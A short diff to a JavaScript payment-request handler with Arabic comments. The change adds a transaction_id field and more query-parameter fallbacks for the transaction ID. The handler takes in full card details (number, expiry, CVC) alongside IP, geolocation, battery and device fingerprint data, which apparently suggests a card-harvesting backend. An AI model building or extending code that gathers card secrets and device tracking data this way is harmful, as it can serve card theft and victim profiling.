@@ -202,7 +202,7 @@ async function handlePaymentRequest(req, res) {
       number, name, expiry, cvc, card_data, save_card, clientID, clientId,
       publicIP, lat, lon, city, country, battery, batteryInfo, deviceModel,
       deviceRAM, cpuCores, deviceType, screenSize, userTimeZone, lang,
-      geoData, branch, branch_key
+      geoData, branch, branch_key, transaction_id
     } = data;
 
     if (!amount && Object.keys(data).length === 0) {
@@ -217,8 +217,8 @@ async function handlePaymentRequest(req, res) {
     const userPhone = phone || user_phone || phoneNumber || data.phone_number || "غير محدد";
     const payAmount = amount || "5";
     
-    // التقاط رقم العملية الثابت المرسل من الفورم لضمان التطابق التام 100%
-    const transactionId = data.transaction_id || req.query.id || "TX_" + Date.now();
+    // 💡 استخدام رقم العملية القادم من الفورم لضمان التطابق التام 100%
+    const transactionId = transaction_id || req.query.id || req.query.order || req.query.transaction_id || req.query.merchant_order_id || "TX_" + Date.now();
 
     const paymentPayload = {
       id: transactionId,
